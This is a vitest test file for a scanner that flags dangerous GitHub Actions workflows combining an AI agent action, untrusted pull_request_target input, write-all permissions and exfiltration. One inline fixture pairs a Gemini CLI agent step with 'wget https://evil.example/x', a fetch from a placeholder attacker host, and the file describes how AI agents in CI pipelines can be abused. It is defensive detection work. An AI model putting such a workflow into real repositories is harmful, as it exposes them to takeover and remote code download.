import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { scanWorkflow } from "./scan.js";

const root = join(dirname(fileURLToPath(import.meta.url)), "..", "fixtures");

function load(name: string): string {
  return readFileSync(join(root, name), "utf8");
}

describe("scanWorkflow", () => {
  it("flags fatal triangle on gold fixture", () => {
    const result = scanWorkflow(load("fatal-triangle.yml"), {
      filename: "fatal-triangle.yml",
    });
    expect(result.summary.fatalTriangle).toBe(true);
    expect(result.findings.some((f) => f.ruleId === "TG-TRIAD")).toBe(true);
    expect(result.findings.some((f) => f.ruleId === "TG-AGENT")).toBe(true);
    expect(result.findings.some((f) => f.ruleId === "TG-UNTRUSTED")).toBe(true);
    expect(result.findings.some((f) => f.ruleId === "TG-PRIV")).toBe(true);
    expect(result.findings.some((f) => f.ruleId === "TG-EXFIL")).toBe(true);
    expect(result.disclaimer.toLowerCase()).toContain("does not certify compliance");
  });

  it("stays quiet on clean CI without agent", () => {
    const result = scanWorkflow(load("clean-ci.yml"));
    expect(result.summary.fatalTriangle).toBe(false);
    expect(result.findings.filter((f) => f.severity === "critical")).toHaveLength(0);
    expect(result.findings.some((f) => f.ruleId === "TG-AGENT")).toBe(false);
  });

  it("reports agent info without fatal on safe agent workflow", () => {
    const result = scanWorkflow(load("agent-safe.yml"));
    expect(result.findings.some((f) => f.ruleId === "TG-AGENT")).toBe(true);
    expect(result.summary.fatalTriangle).toBe(false);
  });

  it("detects gemini and codex agent actions", () => {
    const yaml = `
on: pull_request_target
permissions: write-all
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/run-gemini-cli@v1
      - run: wget https://evil.example/x
`;
    const result = scanWorkflow(yaml);
    expect(result.findings.some((f) => f.message.includes("run-gemini-cli"))).toBe(true);
    expect(result.summary.fatalTriangle).toBe(true);
  });
});
